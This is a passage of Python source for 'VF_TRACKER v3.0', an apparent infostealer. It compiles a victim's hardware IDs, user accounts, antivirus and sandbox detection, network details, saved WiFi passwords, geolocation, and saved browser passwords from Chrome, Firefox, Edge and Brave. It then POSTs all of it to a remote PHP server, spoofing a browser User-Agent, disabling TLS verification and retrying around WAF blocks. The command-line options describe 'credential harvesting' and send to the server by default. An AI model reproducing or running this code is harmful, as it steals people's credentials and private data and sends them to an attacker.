    lines.append(f"  {'[USER IDENTITY]':^70}")
    lines.append(sep2)
    lines.append(f"  [USER] Username          : {username}")
    lines.append(f"  [USER] Full Name         : {fullname}")
    lines.append(f"  [USER] Last Login        : {last_login}")
    lines.append(f"  [USER] Domain/Workgroup  : {domain_wg}")
    lines.append(f"  [USER] Timezone/Locale   : {tz_locale}")
    lines.append(f"  [USER] Keyboard Layout   : {kb_layout}")
    lines.append(f"  [USER] All Users:")
    for u in users_list[:10]:
        if u: lines.append(f"         - {u}")

    # ── Section 4: Environment ──
    lines.append("")
    lines.append(f"  {'[ENVIRONMENT DETECTION]':^70}")
    lines.append(sep2)
    lines.append(f"  [ENV] Antivirus:")
    for av in antivirus:
        if av: lines.append(f"         - {av}")
    lines.append(f"  [ENV] VM/Sandbox Detection:")
    for vm in vm_detection:
        if vm: lines.append(f"         - {vm}")
    lines.append(f"  [ENV] VPN/Proxy Detection:")
    for vp in vpn_proxy:
        if vp: lines.append(f"         - {vp}")
    lines.append(f"  [ENV] Installed Programs ({len(programs)} shown):")
    for prog in programs[:20]:
        if prog: lines.append(f"         - {prog}")
    lines.append(f"  [ENV] Running Processes ({len(processes)} shown):")
    for proc in processes[:15]:
        if proc: lines.append(f"         - {proc}")

    # ── Section 5: Network ──
    lines.append("")
    lines.append(f"  {'[NETWORK - INTERNAL]':^70}")
    lines.append(sep2)
    lines.append(f"  [NET] Local IP           : {local_ip}")
    lines.append(f"  [NET] Gateway            : {gateway}")
    lines.append(f"  [NET] DNS Servers        : {', '.join(dns_servers[:3])}")
    lines.append(f"  [NET] DHCP Server        : {dhcp_server}")
    lines.append(f"  [NET] Network Adapters:")
    for ad in adapters[:5]:
        if ad: lines.append(f"         - {ad}")
    lines.append(f"  [NET] Proxy Settings:")
    for ps in proxy_settings:
        if ps: lines.append(f"         - {ps}")

    # ── Section 6: WiFi ──
    lines.append("")
    lines.append(f"  {'[WIFI INFORMATION]':^70}")
    lines.append(sep2)
    lines.append(f"  [WIFI] Current SSID      : {wifi_ssid}")
    lines.append(f"  [WIFI] Signal Strength   : {wifi_signal}")
    lines.append(f"  [WIFI] Previous Networks ({len(wifi_profiles)} total):")
    for wp in wifi_profiles:
        if wp: lines.append(f"         - {wp}")
    lines.append(f"  [WIFI] Saved Passwords:")
    for name, passw in wifi_passwords:
        lines.append(f"         -> {name:<25} | Pass: {passw}")

    # ── Section 7: Public IP & Location ──
    lines.append("")
    lines.append(f"  {'[PUBLIC IP & GEOLOCATION]':^70}")
    lines.append(sep2)
    if pub_ip and pub_ip not in ("Not found", "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"):
        lines.append(f"  [NET] Public IP          : {pub_ip}")
        lines.append(f"  [NET] ISP                : {isp}")
        lines.append(f"  [LOC] Country            : {country}")
        lines.append(f"  [LOC] City               : {city}")
        lines.append(f"  [LOC] Coordinates        : {coords}")
        if maps_link != "N/A":
            lines.append(f"  [LOC] Google Maps        : {maps_link}")
    else:
        lines.append(f"  [ERROR] Internet info retrieval failed.")

    # ── Section 8: Browser Credentials ──
    lines.append("")
    _bc_title = "[BROWSER CREDENTIALS]"
    lines.append(f"  {_bc_title:^70}")
    lines.append(sep2)

    cred_summary = credentials.get("summary", {})
    chr_pw = credentials.get("chrome_passwords", [])
    ff_pw = credentials.get("firefox_passwords", [])
    edge_pw = credentials.get("edge_passwords", [])
    brave_pw = credentials.get("brave_passwords", [])
    chr_cookies_count = credentials.get("chrome_cookies_count", 0)

    lines.append(f"  [CRED] Chrome Passwords   : {cred_summary.get('chrome_passwords', 0)} found")
    lines.append(f"  [CRED] Chrome Cookies      : {chr_cookies_count} found")
    lines.append(f"  [CRED] Firefox Passwords   : {cred_summary.get('firefox_passwords', 0)} found ({cred_summary.get('firefox_decrypted', 0)} decrypted)")
    lines.append(f"  [CRED] Edge Passwords      : {cred_summary.get('edge_passwords', 0)} found")
    lines.append(f"  [CRED] Brave Passwords     : {cred_summary.get('brave_passwords', 0)} found")

    if chr_pw:
        lines.append(f"  [CRED] Chrome Saved Passwords:")
        for cred in chr_pw[:30]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")

    if ff_pw:
        lines.append(f"  [CRED] Firefox Saved Passwords:")
        for cred in ff_pw[:20]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")

    if edge_pw:
        lines.append(f"  [CRED] Edge Saved Passwords:")
        for cred in edge_pw[:20]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")

    if brave_pw:
        lines.append(f"  [CRED] Brave Saved Passwords:")
        for cred in brave_pw[:20]:
            url = cred.get('url', '?')[:50]
            user = cred.get('username', '?')
            pw = cred.get('password', '?')
            lines.append(f"         -> {url}")
            lines.append(f"            User: {user} | Pass: {pw}")

    # ── Section 9: Security ──
    lines.append("")
    lines.append(f"  {'[SECURITY]':^70}")
    lines.append(sep2)
    lines.append(f"  [SEC] Firewall Status:")
    for f in firewall:
        if f: lines.append(f"         - {f}")
    lines.append(f"  [SEC] Active Connections:")
    for conn in connections:
        if conn: lines.append(f"         -> {conn}")
    lines.append(f"  [SEC] LAN Devices (ARP):")
    for device in arp_devices:
        if device: lines.append(f"         -> {device}")

    lines.append("")
    lines.append(sep)

    report_text = "\n".join(lines)

    # ═══ Write TXT file ═══
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(report_text)
        log(f"\n  [OK] Report saved to: {output_path}")
    except Exception as e:
        log(f"\n  [ERROR] Failed to save: {e}")
        try:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            fallback = os.path.join(desktop, "VF_TRACKER_REPORT.txt")
            with open(fallback, 'w', encoding='utf-8') as f:
                f.write(report_text)
            log(f"  [OK] Fallback saved to: {fallback}")
            output_path = fallback
        except Exception:
            log(f"  [ERROR] Fallback also failed")

    # ═══ Build JSON data ═══
    report_data = {
        "version": "3.0",
        "timestamp": timestamp,
        "admin": admin_status,
        "is_new_machine": is_new_machine,
        "previous_machine_id": existing_marker,
        # Hardware
        "hwid": hwid,
        "machine_id": machine_id,
        "motherboard_serial": motherboard,
        "bios_uuid": bios_uuid,
        "cpu_processor_id": cpu_id,
        "disk_serial": disk_serial,
        "gpu": gpu_list,
        "battery": battery,
        "mac_address": mac_addr,
        # System
        "hostname": hostname,
        "os": os_info,
        "cpu": cpu_info,
        "uptime": uptime,
        "hardware": hw_info,
        # User
        "username": username,
        "fullname": fullname,
        "last_login": last_login,
        "users": users_list,
        "domain_workgroup": domain_wg,
        "timezone_locale": tz_locale,
        "keyboard_layout": kb_layout,
        # Environment
        "antivirus": antivirus,
        "vm_detection": vm_detection,
        "vpn_proxy": vpn_proxy,
        "installed_programs": programs[:30],
        "running_processes": processes,
        # Network
        "local_ip": local_ip,
        "gateway": gateway,
        "dns_servers": dns_servers,
        "dhcp_server": dhcp_server,
        "network_adapters": adapters,
        "proxy_settings": proxy_settings,
        "wifi_ssid": wifi_ssid,
        "wifi_signal": wifi_signal,
        "wifi_profiles": wifi_profiles,
        "wifi_passwords": [{"name": n, "password": p} for n, p in wifi_passwords],
        # Public
        "public_ip": pub_ip,
        "isp": isp,
        "country": country,
        "city": city,
        "coordinates": coords,
        "maps_link": maps_link,
        # Credentials
        "credentials": credentials,
        # Security
        "firewall": firewall,
        "active_connections": connections,
        "arp_devices": arp_devices,
    }

    # ═══ Save JSON ═══
    json_path = output_path.replace('.txt', '.json')
    try:
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        log(f"  [OK] JSON saved to: {json_path}")
    except Exception as e:
        log(f"  [ERROR] JSON save failed: {e}")

    if not silent:
        print(report_text)

    return output_path, report_text, report_data


# ═══════════════════════════════════════════════════════════════════════════════
# SERVER SENDER — POST data to PHP endpoint
# ═══════════════════════════════════════════════════════════════════════════════

def send_to_server(server_url, token, report_text, report_data, silent=False):
    """Send tracker report to remote PHP server via HTTP POST with retry."""
    def log(msg):
        if not silent:
            print(msg)

    max_retries = 3
    for attempt in range(1, max_retries + 1):
        try:
            post_data = urllib.parse.urlencode({
                'vf_token': token,
                'tracker_data': report_text,
                'tracker_json': json.dumps(report_data, ensure_ascii=False)
            }).encode('utf-8')

            req = urllib.request.Request(server_url, data=post_data, method='POST')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
            req.add_header('Referer', server_url)
            req.add_header('Origin', server_url.rsplit('/', 1)[0] if '/' in server_url else server_url)
            req.add_header('Connection', 'keep-alive')

            ctx = ssl._create_unverified_context()
            response = urllib.request.urlopen(req, timeout=20, context=ctx)
            response_data = response.read().decode('utf-8')

            try:
                result = json.loads(response_data)
                if result.get('status') == 'ok':
                    log(f"  [OK] Report sent to server: {server_url}")
                    log(f"       Saved as: {result.get('file', 'unknown')}")
                    return True
                else:
                    log(f"  [ERROR] Server rejected: {result.get('message', 'Unknown error')}")
                    if attempt < max_retries:
                        import time as _t
                        log(f"  [RETRY] Attempt {attempt+1}/{max_retries} in 3s...")
                        _t.sleep(3)
                        continue
                    return False
            except json.JSONDecodeError:
                log(f"  [OK] Server received data")
                return True

        except urllib.error.HTTPError as e:
            if e.code == 403 and attempt < max_retries:
                import time as _t
                log(f"  [WARN] HTTP 403 - WAF/CDN block? Retry {attempt+1}/{max_retries} in 5s...")
                _t.sleep(5)
                continue
            log(f"  [ERROR] Server HTTP {e.code}: {e.reason}")
            if attempt < max_retries:
                import time as _t
                _t.sleep(3)
                continue
            return False
        except urllib.error.URLError as e:
            log(f"  [ERROR] Cannot reach server: {e.reason}")
            if attempt < max_retries:
                import time as _t
                log(f"  [RETRY] Attempt {attempt+1}/{max_retries} in 5s...")
                _t.sleep(5)
                continue
            return False
        except Exception as e:
            log(f"  [ERROR] Send failed: {e}")
            if attempt < max_retries:
                import time as _t
                _t.sleep(3)
                continue
            return False

    log(f"  [FAILED] All {max_retries} attempts failed.")
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VF_TRACKER v3.0 - Advanced System Identity Tracker")
    parser.add_argument("--output", "-o", type=str, default=None,
                        help="Custom output path for TXT report")
    parser.add_argument("--silent", "-s", action="store_true",
                        help="Silent mode - only write to file")
    parser.add_argument("--server", type=str, default=DEFAULT_SERVER_URL,
                        help=f"PHP receiver URL (default: {DEFAULT_SERVER_URL})")
    parser.add_argument("--no-server", action="store_true",
                        help="Skip sending to server (local only)")
    parser.add_argument("--no-creds", action="store_true",
                        help="Skip credential harvesting (browsers)")
    parser.add_argument("--token", type=str, default=VF_SECRET_TOKEN,
                        help="Security token for server authentication")
    args = parser.parse_args()

    result_path, report_text, report_data = build_report(
        output_path=args.output, silent=args.silent
    )

    if not args.no_server and args.server:
        send_to_server(
            server_url=args.server,
            token=args.token,
            report_text=report_text,
            report_data=report_data,
            silent=args.silent
        )
